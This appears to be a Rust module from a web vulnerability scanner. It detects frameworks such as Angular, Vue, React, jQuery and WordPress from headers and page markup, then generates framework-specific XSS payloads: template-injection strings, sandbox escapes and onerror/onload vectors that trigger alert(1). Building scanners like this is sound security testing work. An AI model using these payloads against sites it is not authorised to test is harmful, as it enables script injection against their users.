//! Technology/framework detection from HTTP response headers and body.
//!
//! Detects frontend frameworks and libraries to enable targeted XSS payloads:
//! - Angular → template injection payloads
//! - React → dangerouslySetInnerHTML vectors
//! - Vue.js → v-html/template injection
//! - jQuery → $.globalEval, $.html vectors
//! - Handlebars/Mustache → template injection
//! - Svelte/Ember → framework-specific vectors

use reqwest::header::HeaderMap;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TechType {
    Angular,
    React,
    Vue,
    JQuery,
    Handlebars,
    Svelte,
    Ember,
    Backbone,
    Knockout,
    WordPress,
    ASPNet,
    PHP,
    Express,
    NextJs,
    Nuxt,
}

impl std::fmt::Display for TechType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TechType::Angular => write!(f, "Angular"),
            TechType::React => write!(f, "React"),
            TechType::Vue => write!(f, "Vue.js"),
            TechType::JQuery => write!(f, "jQuery"),
            TechType::Handlebars => write!(f, "Handlebars"),
            TechType::Svelte => write!(f, "Svelte"),
            TechType::Ember => write!(f, "Ember"),
            TechType::Backbone => write!(f, "Backbone"),
            TechType::Knockout => write!(f, "Knockout"),
            TechType::WordPress => write!(f, "WordPress"),
            TechType::ASPNet => write!(f, "ASP.NET"),
            TechType::PHP => write!(f, "PHP"),
            TechType::Express => write!(f, "Express"),
            TechType::NextJs => write!(f, "Next.js"),
            TechType::Nuxt => write!(f, "Nuxt"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct TechDetection {
    pub tech: TechType,
    pub evidence: String,
}

#[derive(Debug, Clone, Default)]
pub struct TechDetectionResult {
    pub detected: Vec<TechDetection>,
}

impl TechDetectionResult {
    pub fn is_empty(&self) -> bool {
        self.detected.is_empty()
    }

    pub fn has(&self, tech: &TechType) -> bool {
        self.detected.iter().any(|d| &d.tech == tech)
    }

    pub fn techs(&self) -> Vec<&TechType> {
        self.detected.iter().map(|d| &d.tech).collect()
    }
}

struct HeaderDetectRule {
    header: &'static str,
    value_contains: Option<&'static str>,
    tech: TechType,
    evidence: &'static str,
}

struct BodyDetectRule {
    pattern: &'static str,
    tech: TechType,
    evidence: &'static str,
}

/// Detect technologies from response headers and body.
pub fn detect_technologies(headers: &HeaderMap, body: Option<&str>) -> TechDetectionResult {
    let mut result = TechDetectionResult::default();

    // Header-based detection
    let header_rules = [
        HeaderDetectRule {
            header: "x-powered-by",
            value_contains: Some("asp.net"),
            tech: TechType::ASPNet,
            evidence: "X-Powered-By: ASP.NET",
        },
        HeaderDetectRule {
            header: "x-powered-by",
            value_contains: Some("php"),
            tech: TechType::PHP,
            evidence: "X-Powered-By: PHP",
        },
        HeaderDetectRule {
            header: "x-powered-by",
            value_contains: Some("express"),
            tech: TechType::Express,
            evidence: "X-Powered-By: Express",
        },
        HeaderDetectRule {
            header: "x-powered-by",
            value_contains: Some("next.js"),
            tech: TechType::NextJs,
            evidence: "X-Powered-By: Next.js",
        },
        HeaderDetectRule {
            header: "x-generator",
            value_contains: Some("wordpress"),
            tech: TechType::WordPress,
            evidence: "X-Generator: WordPress",
        },
        HeaderDetectRule {
            header: "link",
            value_contains: Some("wp-json"),
            tech: TechType::WordPress,
            evidence: "Link: wp-json (WordPress REST API)",
        },
    ];

    for rule in &header_rules {
        if let Some(val) = headers.get(rule.header) {
            let matched = match rule.value_contains {
                None => true,
                Some(substr) => val
                    .to_str()
                    .ok()
                    .map(|v| v.to_ascii_lowercase().contains(substr))
                    .unwrap_or(false),
            };
            if matched {
                merge_detection(
                    &mut result,
                    TechDetection {
                        tech: rule.tech.clone(),
                        evidence: rule.evidence.to_string(),
                    },
                );
            }
        }
    }

    // Body-based detection
    if let Some(body_text) = body {
        let body_lower = body_text.to_ascii_lowercase();

        let body_rules = [
            // Angular
            BodyDetectRule {
                pattern: "ng-app",
                tech: TechType::Angular,
                evidence: "ng-app attribute",
            },
            BodyDetectRule {
                pattern: "ng-controller",
                tech: TechType::Angular,
                evidence: "ng-controller attribute",
            },
            BodyDetectRule {
                pattern: "ng-model",
                tech: TechType::Angular,
                evidence: "ng-model attribute",
            },
            BodyDetectRule {
                pattern: "angular.min.js",
                tech: TechType::Angular,
                evidence: "angular.min.js script",
            },
            BodyDetectRule {
                pattern: "angular.js",
                tech: TechType::Angular,
                evidence: "angular.js script",
            },
            BodyDetectRule {
                pattern: "ng-version",
                tech: TechType::Angular,
                evidence: "ng-version attribute",
            },
            // React
            BodyDetectRule {
                pattern: "data-reactroot",
                tech: TechType::React,
                evidence: "data-reactroot attribute",
            },
            BodyDetectRule {
                pattern: "data-reactid",
                tech: TechType::React,
                evidence: "data-reactid attribute",
            },
            BodyDetectRule {
                pattern: "__next_data__",
                tech: TechType::React,
                evidence: "__NEXT_DATA__ (Next.js/React)",
            },
            BodyDetectRule {
                pattern: "react.production.min.js",
                tech: TechType::React,
                evidence: "react.production.min.js",
            },
            BodyDetectRule {
                pattern: "react-dom",
                tech: TechType::React,
                evidence: "react-dom script reference",
            },
            // Vue.js
            BodyDetectRule {
                pattern: "v-app",
                tech: TechType::Vue,
                evidence: "v-app attribute",
            },
            BodyDetectRule {
                pattern: "data-v-",
                tech: TechType::Vue,
                evidence: "data-v- scoped style attribute",
            },
            BodyDetectRule {
                pattern: "vue.min.js",
                tech: TechType::Vue,
                evidence: "vue.min.js script",
            },
            BodyDetectRule {
                pattern: "vue.js",
                tech: TechType::Vue,
                evidence: "vue.js script",
            },
            BodyDetectRule {
                pattern: "vue.global",
                tech: TechType::Vue,
                evidence: "vue.global script",
            },
            // jQuery
            BodyDetectRule {
                pattern: "jquery.min.js",
                tech: TechType::JQuery,
                evidence: "jquery.min.js script",
            },
            BodyDetectRule {
                pattern: "jquery.js",
                tech: TechType::JQuery,
                evidence: "jquery.js script",
            },
            BodyDetectRule {
                pattern: "jquery/",
                tech: TechType::JQuery,
                evidence: "jQuery CDN path",
            },
            // Handlebars
            BodyDetectRule {
                pattern: "handlebars.min.js",
                tech: TechType::Handlebars,
                evidence: "handlebars.min.js",
            },
            BodyDetectRule {
                pattern: "handlebars.js",
                tech: TechType::Handlebars,
                evidence: "handlebars.js",
            },
            // Svelte
            BodyDetectRule {
                pattern: "svelte",
                tech: TechType::Svelte,
                evidence: "Svelte reference in body",
            },
            // Ember
            BodyDetectRule {
                pattern: "ember.min.js",
                tech: TechType::Ember,
                evidence: "ember.min.js",
            },
            BodyDetectRule {
                pattern: "ember.js",
                tech: TechType::Ember,
                evidence: "ember.js",
            },
            BodyDetectRule {
                pattern: "data-ember",
                tech: TechType::Ember,
                evidence: "data-ember attribute",
            },
            // Backbone
            BodyDetectRule {
                pattern: "backbone.min.js",
                tech: TechType::Backbone,
                evidence: "backbone.min.js",
            },
            BodyDetectRule {
                pattern: "backbone.js",
                tech: TechType::Backbone,
                evidence: "backbone.js",
            },
            // Knockout
            BodyDetectRule {
                pattern: "knockout.min.js",
                tech: TechType::Knockout,
                evidence: "knockout.min.js",
            },
            BodyDetectRule {
                pattern: "ko.observable",
                tech: TechType::Knockout,
                evidence: "ko.observable (Knockout)",
            },
            BodyDetectRule {
                pattern: "data-bind=",
                tech: TechType::Knockout,
                evidence: "data-bind attribute (Knockout)",
            },
            // WordPress
            BodyDetectRule {
                pattern: "wp-content/",
                tech: TechType::WordPress,
                evidence: "wp-content/ path",
            },
            BodyDetectRule {
                pattern: "wp-includes/",
                tech: TechType::WordPress,
                evidence: "wp-includes/ path",
            },
            // Nuxt
            BodyDetectRule {
                pattern: "__nuxt",
                tech: TechType::Nuxt,
                evidence: "__NUXT reference",
            },
            BodyDetectRule {
                pattern: "nuxt.js",
                tech: TechType::Nuxt,
                evidence: "nuxt.js script",
            },
            // Next.js (body)
            BodyDetectRule {
                pattern: "_next/static",
                tech: TechType::NextJs,
                evidence: "_next/static path",
            },
        ];

        for rule in &body_rules {
            if body_lower.contains(rule.pattern) {
                merge_detection(
                    &mut result,
                    TechDetection {
                        tech: rule.tech.clone(),
                        evidence: rule.evidence.to_string(),
                    },
                );
            }
        }

        // Fallback heuristic for client-side template injection (CSTI):
        // when no specific template framework (Angular, Vue, Handlebars,
        // Ember) has been identified yet, a literal `{{identifier}}`
        // interpolation surviving into the response body is a strong
        // signal that *some* client-side template engine is active —
        // typically a minified Angular/Vue bundle whose ng-app /
        // angular.js / vue.js banner has been tree-shaken away. Tagging
        // the target as Angular here lets the existing
        // `get_tech_specific_payloads` path fire AngularJS-flavored
        // template-escape payloads (which double as Vue 2 sandbox
        // escapes), recovering CSTI true positives we otherwise miss.
        let no_template_framework_detected = !result.has(&TechType::Angular)
            && !result.has(&TechType::Vue)
            && !result.has(&TechType::Handlebars)
            && !result.has(&TechType::Ember);
        if no_template_framework_detected && has_interpolation_brackets(body_text) {
            merge_detection(
                &mut result,
                TechDetection {
                    tech: TechType::Angular,
                    evidence: "interpolation `{{…}}` literal in body".to_string(),
                },
            );
        }
    }

    result
}

/// True when the response body contains at least one `{{identifier}}`
/// interpolation. Conservative: requires an identifier-shaped token
/// (`a-zA-Z_$` start, optionally followed by `\w` / `.` / `[…]` chain)
/// between the braces so we don't trip on prose like `{{ }}` or
/// `{{ TODO }}` placeholders rendered as plain text.
fn has_interpolation_brackets(body: &str) -> bool {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let re = RE.get_or_init(|| {
        regex::Regex::new(r"\{\{\s*[a-zA-Z_$][\w.\[\]]*\s*\}\}")
            .expect("interpolation regex is well-formed")
    });
    re.is_match(body)
}

/// Merge detection, deduplicate by tech type.
fn merge_detection(result: &mut TechDetectionResult, detection: TechDetection) {
    if !result.has(&detection.tech) {
        result.detected.push(detection);
    }
}

/// Generate framework-specific XSS payloads based on detected technologies.
pub fn get_tech_specific_payloads(techs: &TechDetectionResult) -> Vec<String> {
    let class_marker = crate::scanning::markers::class_marker();
    let mut payloads = Vec::new();

    for detection in &techs.detected {
        match &detection.tech {
            TechType::Angular => {
                // Angular template injection (AngularJS 1.x)
                payloads.push(format!(
                    "{{{{constructor.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "{{{{$on.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                // Angular expression sandbox escape (various versions)
                payloads.push(format!(
                    "{{{{a]constructor.prototype.charAt=[].join;$eval('x]alert(1)//');}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::Vue => {
                // Vue.js template injection (v2/v3)
                payloads.push(format!(
                    "{{{{_c.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "{{{{this.constructor.constructor('alert(1)')()}}}} <span class={}>",
                    class_marker
                ));
                // v-html injection marker
                payloads.push(format!(
                    "<div v-html=\"'<img src=x onerror=alert(1)>'\" class={}></div>",
                    class_marker
                ));
            }
            TechType::JQuery => {
                // jQuery-specific vectors
                payloads.push(format!(
                    "<img src=x onerror=$.globalEval('alert(1)') class={}>",
                    class_marker
                ));
                payloads.push(format!(
                    "<img src=x onerror=jQuery.globalEval('alert(1)') class={}>",
                    class_marker
                ));
            }
            TechType::Handlebars => {
                // Handlebars template injection
                payloads.push(format!(
                    "{{{{#with \"alert(1)\"}}}}{{{{this}}}}{{{{/with}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::Knockout => {
                // Knockout.js data-bind injection
                payloads.push(format!(
                    "<div data-bind=\"html:'<img src=x onerror=alert(1)>'\" class={}></div>",
                    class_marker
                ));
                payloads.push(format!(
                    "<div data-bind=\"attr:{{style:'x:expression(alert(1))'}}\" class={}></div>",
                    class_marker
                ));
            }
            TechType::Ember => {
                // Ember template injection
                payloads.push(format!(
                    "{{{{this.constructor.constructor(\"alert(1)\")()}}}} <span class={}>",
                    class_marker
                ));
            }
            TechType::WordPress => {
                // WordPress-specific: common plugin/theme XSS patterns
                payloads.push(format!(
                    "<img src=x onerror=alert(1) class={}>",
                    class_marker
                ));
            }
            TechType::React => {
                // React escapes text content by default. The XSS surface
                // is concentrated in two patterns:
                //   1. `<a href={userInput}>` — React still renders
                //      `javascript:` URLs (a runtime warning since 16.9
                //      but no actual sanitization). Hit href / iframe
                //      src / form action contexts via the protocol
                //      payload.
                //   2. `dangerouslySetInnerHTML={{__html: userInput}}` —
                //      maps to `innerHTML`, so `<svg onload>` /
                //      `<img onerror>` payloads execute. Server-side
                //      rendering puts the resulting HTML straight into
                //      the response, so a generic HTML payload also
                //      works; the `class={}` marker here lets us
                //      attribute the finding to the React-aware path.
                payloads.push(format!(
                    "javascript:alert(1)/*{}*/",
                    class_marker
                ));
                payloads.push(format!(
                    "<svg onload=alert(1) class={}></svg>",
                    class_marker
                ));
                payloads.push(format!(
                    "<img src=x onerror=alert(1) class={}>",
                    class_marker
                ));
            }
            // Server-side techs: no specific client-side payloads needed
            TechType::Svelte
            | TechType::Backbone
            | TechType::ASPNet
            | TechType::PHP
            | TechType::Express
            | TechType::NextJs
            | TechType::Nuxt => {}
        }
    }

    payloads
}

#[cfg(test)]
mod tests;
